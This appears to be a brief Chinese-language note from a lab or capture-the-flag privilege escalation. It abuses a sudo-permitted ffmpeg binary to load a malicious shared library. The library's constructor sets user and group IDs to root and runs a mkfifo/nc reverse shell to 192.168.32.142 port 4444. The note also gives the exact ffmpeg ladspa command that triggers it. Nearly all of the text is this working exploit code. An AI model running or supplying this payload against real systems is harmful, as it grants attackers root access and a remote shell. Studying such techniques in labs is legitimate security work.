sudo -l 发现 /usr/bin/ffmpeg，gtfobins的payload有点问题而且靶机上没有gcc，改成反弹shell的，然后传上去

```
echo '#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() { 
    setuid(0); 
    setgid(0); 
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.32.142 4444 >/tmp/f"); 
}' | gcc -w -fPIC -shared -o lib.so -x c -

sudo /usr/bin/ffmpeg -f lavfi -i anullsrc -af ladspa=file=/tmp/lib.so /tmp/output.wav
```
